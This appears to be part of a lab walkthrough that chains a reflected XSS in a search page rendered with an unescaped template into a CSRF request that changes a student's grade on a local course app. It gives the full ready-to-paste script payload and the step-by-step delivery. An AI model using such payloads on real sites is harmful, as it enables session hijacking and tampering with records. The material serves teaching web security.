 ── STAGE 2 : REFLECTED XSS   (delivery — via announcements feed) ──

   Link URL  (the XSS payload — it's the part AFTER `?q=`) :

http://localhost:5000/search?q=<script>...</script>
                              └────────┬────────┘
                              this drops raw into the page
                              because the template renders   {{ q|safe }}

   Negm publishes it. The bait sits in the feed waiting for an admin
   to click.

 ── STAGE 3 : CSRF (what the script does) ──

   The body of the <script> tag is the CSRF payload. It runs INSIDE
   the admin's logged-in browser, so the admin's session cookie
   travels with the request automatically (credentials:'include').

   The fetch() inside the script:

       fetch('/courses/7/grade',                  ← the target endpoint
             {method:'POST', credentials:'include',
              body: new URLSearchParams({
                       student_id: 4,             ← Negm  (from SQLi)
                       grade: 'A+'                ← the desired grade
                    })})

   Endpoint has NO CSRF token check  →  server happily writes the row.

 ── PUT IT ALL TOGETHER  —  the Link URL to paste in the announcement ──

http://localhost:5000/search?q=<script>fetch('/courses/7/grade',{method:'POST',credentials:'include',body:new URLSearchParams({student_id:4,grade:'A+'})})</script>

 ── DELIVERY  (the chain firing) ──

   1.  log in as  Dairo
   2.  Open  /announcements  →  click Negm's post.
   3.  Browser navigates to  /search?q=<script>…</script>
       →  XSS fires  →  fetch sends POST  →  302 OK.
   4.  Switch back to Negm  →  /my-grades
       →  ECE330 shows  A+  ·  GPA  3.53 → 3.67.
